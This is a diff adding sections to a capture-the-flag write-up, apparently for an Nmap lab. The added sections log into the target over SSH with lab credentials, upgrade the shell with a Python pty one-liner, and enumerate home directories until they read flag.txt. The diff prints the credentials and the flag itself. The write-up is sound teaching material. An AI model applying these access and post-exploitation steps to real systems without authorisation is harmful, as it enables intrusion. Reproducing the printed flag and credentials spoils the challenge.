@@ -16,11 +16,12 @@ This CTF requires basic knowledge of:
 
 ## Contents
 
-* [Getting Started]("Jump To ")
-* [Port Scan]("Jump To ")
-* [Finding Credentials]("Jump To ")
-* [Logging Onto Remote Server]("Jump To ")
-* [Finding The Flag]("Jump To ")
+* [Getting Started](#getting-started "Jump To Getting Started")
+* [Port Scan](#port-scan "Jump To Port Scan")
+* [Finding Credentials](#credentials "Jump To Credentials")
+* [Logging Onto Remote Server](#ssh "Jump To SSH")
+* [Upgrading Dumb Terminal](#upgrade-terminal "Jump To Upgrade Terminal")
+* [Finding The Flag](#flag "Jump To Flag")
 
 ---
 
@@ -103,7 +104,50 @@ After doing any of the above steps we'll get the credentials ```ubuntu:Dafdas!!/
 
 ## SSH
 
+Now that we have the login credentials we can connect to the remote target via ```SSH``` with the username ```ubuntu``` and the password ```Dafdas!!/str0ng```.
 
+```
+$ ssh ubuntu@<IP_Address>
+
+ubuntu@<IP_Address>'s password: Dafdas!!/str0ng
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-1014-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+$
+```
+
+[Back To Top](#intermediate-nmap "Jump To Top")
+
+---
+
+## Upgrade Terminal
+
+Now that we've logged in we can see that we're working on a dumb terminal. We can make things easier for us by upgrading the terminal with ```Python```. But first we should make sure if ```Python``` is on the target system. We can do this by using the linux ```which``` command followed by the executable file name we're looking for. In this case we're looking for any python version, so the command will look like this...
+
+```
+$ which python python2 python3
+
+/usr/bin/python3
+```
+
+Now that we've verified what version of Python is on the target system we can use the following command to upgrade the shell...
+
+```python3 -c 'import pty;pty.spawn("/bin/bash")';```
 
 [Back To Top](#intermediate-nmap "Jump To Top")
 
@@ -111,6 +155,51 @@ After doing any of the above steps we'll get the credentials ```ubuntu:Dafdas!!/
 
 ## Flag
 
+Now that the terminal has been upgraded we can start looking for the flag. We'll start by checking where we are with ```pwd``` and listing all the contents in the current directory with ```ls -la```.
 
+```
+ubuntu@f518fa10296d:~$ pwd
+/home/ubuntu
+
+ubuntu@f518fa10296d:~$ ls -la
+total 28
+drwxr-xr-x 1 ubuntu ubuntu 4096 Feb 20 23:21 .
+drwxr-xr-x 1 root   root   4096 Mar  2  2022 ..
+-rw-r--r-- 1 ubuntu ubuntu  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 ubuntu ubuntu 3771 Feb 25  2020 .bashrc
+drwx------ 2 ubuntu ubuntu 4096 Feb 20 23:21 .cache
+-rw-r--r-- 1 ubuntu ubuntu  807 Feb 25  2020 .profile
+```
+
+So there's nothing interesting in our current directory. Our next step is to check what other users exist in the home directory.
+
+```
+ubuntu@f518fa10296d:~$ ls -la /home
+total 20
+drwxr-xr-x 1 root   root   4096 Mar  2  2022 .
+drwxr-xr-x 1 root   root   4096 Mar  2  2022 ..
+drwxr-xr-x 1 ubuntu ubuntu 4096 Feb 20 23:21 ubuntu
+drwxr-xr-x 2 root   root   4096 Mar  2  2022 user
+```
+
+Next we can list all contents in the other users account, where we'll find a file named ```flag.txt```.
+
+```
+ubuntu@f518fa10296d:~$ ls -la /home/user
+
+total 16
+drwxr-xr-x 2 root root 4096 Mar  2  2022 .
+drwxr-xr-x 1 root root 4096 Mar  2  2022 ..
+-rw-rw-r-- 1 root root   38 Mar  2  2022 flag.txt
+
+```
+
+After we ```cat``` the file we'll finally have our flag.
+
+```
+ubuntu@f518fa10296d:~$ cat /home/user/flag.txt
+
+flag{251f309497a18888dde5222761ea88e4}
+```
 
 [Back To Top](#intermediate-nmap "Jump To Top")
